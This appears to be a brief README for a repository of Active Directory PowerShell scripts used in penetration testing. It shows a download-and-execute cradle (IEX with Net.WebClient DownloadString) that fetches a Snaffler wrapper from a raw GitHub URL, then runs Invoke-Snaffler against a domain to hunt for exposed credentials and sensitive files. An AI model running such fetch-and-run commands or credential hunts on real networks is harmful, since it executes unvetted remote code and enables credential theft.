# ad-scripts
Collection of active directory powershell scripts to use

usage:

IEX (New-Object Net.WebClient).DownloadString('')


## Snaffler Usage ##

IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ribthegreat99OrN0P/ad-scripts/refs/heads/main/snafflerPS.ps1')
Invoke-Snaffler -ExeArgs '-s','-d','domain.local'
